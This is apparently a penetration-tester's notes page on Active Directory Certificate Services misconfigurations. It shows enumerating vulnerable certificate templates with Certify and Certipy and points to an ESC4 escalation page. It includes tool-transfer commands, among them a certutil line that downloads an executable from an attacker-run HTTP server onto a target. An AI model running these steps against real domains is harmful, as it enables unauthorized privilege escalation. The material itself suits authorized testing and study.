# AD CS

> Active Directory Certificate Services (AD CS) is a critical component in enterprise networks. ADCS provides public key infrastructure (PKI) for managing digital certificates used in encryption, authentication, and digital signatures. While AD CS plays a vital role in securing communications and identities, it is often overlooked in security audits, leaving it vulnerable to exploitation. Misconfigurations in AD CS can lead to privilege escalation, lateral movement, and persistent attacks within compromised environments. Understanding and securing AD CS is therefore crucial to preventing certificate abuse and maintaining a robust infrastructure.With several ways to abuse misconfigurations on a Certificate Authority (CA) Server, it can be difficult to detect and respond because the techniques leverage legitimate functionalities within the component and by nature, the certificates (contrary to passwords) can remain active for extended periods of time.

{% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}

#### Methodology:

* Upload `Certify.exe` to a Windows target system or use `certipy-ad` on linux
* Check the misconfiguration results (ESC...)
* Exploit misconfiguration to get more privs



## Get misconfiguration from target system

### Certify.exe (From Windows)

> **Certify** is a C# tool to **enumerate** and **abuse misconfigurations** in Active Directory Certificate Services (AD CS).

{% code title="Kali location" %}
```bash
/opt/SharpCollection/NetFramework_4.7_Any/
```
{% endcode %}

#### How it uses

Copy the executable and transfer it into target machine.

{% hint style="info" %}
SharpCollection required
{% endhint %}

{% code title="Create HTTP server" %}
```bash
cp /opt/SharpCollection/NetFramework_4.7_Any .
python3 -m http.server 80
```
{% endcode %}

{% code title="PowerShell" %}
```powershell
certutil -urlcache -f http://<IP>:<PORT>/Certify.exe
```
{% endcode %}

{% code title="Evil-WinRM" %}
```bash
> upload Certify.exe
```
{% endcode %}

Run the executable on Windows target to find certi vulns.

{% code title="Get Vulnerabilities w/ Certify" %}
```powershell
.\Certify.exe find /vulnerable
```
{% endcode %}



### Certipy.py

> **Certipy** is an offensive tool for **enumerating** and **abusing** Active Directory Certificate Services (AD CS)

{% embed url="https://github.com/ly4k/Certipy" %}

{% hint style="info" %}
Certipy-ad is already installed in kali linux
{% endhint %}

{% hint style="danger" %}
Check if the package is up to date!
{% endhint %}

{% code title="Upgrade package in kali" %}
```bash
pipx install certipy-ad
```
{% endcode %}

#### How it uses

Use the bellow command to get all vulnerabilities of the Certificate Templates.

{% code title="Get with pass" %}
```bash
certipy find -u 'billy@foobar.com' -p <password> -dc-ip <DC_IP> -vulnerable -enabled
```
{% endcode %}

{% code title="Get with hash" overflow="wrap" %}
```bash
certipy find -u 'billy@foobar.com' -hashes <hashes> -dc-ip <DC_IP> -vulnerable -enabled
```
{% endcode %}

Use a simple `grep` command to get misconfiguration from the output file.

```bash
cat *_Certipy.txt | grep ESC
```



## Escalate Privilege with CertTemplates misconfigurations

An attacker abusing Active Directory Certificate Services (AD CS) typically follows a sequence of steps, targeting weaknesses in the ESC configuration and processes, focusing on compromising certificates for privilege escalation and lateral movement.



### ESC4 - Vulnerable Certificate Template Access Control

Follow the page below to use this technique to get administrator access to the DC.

{% content-ref url="esc4.md" %}
[esc4.md](esc4.md)
{% endcontent-ref %}





## AD CS common errors

{% embed url="https://sensepost.com/blog/2025/diving-into-ad-cs-exploring-some-common-error-messages/" %}









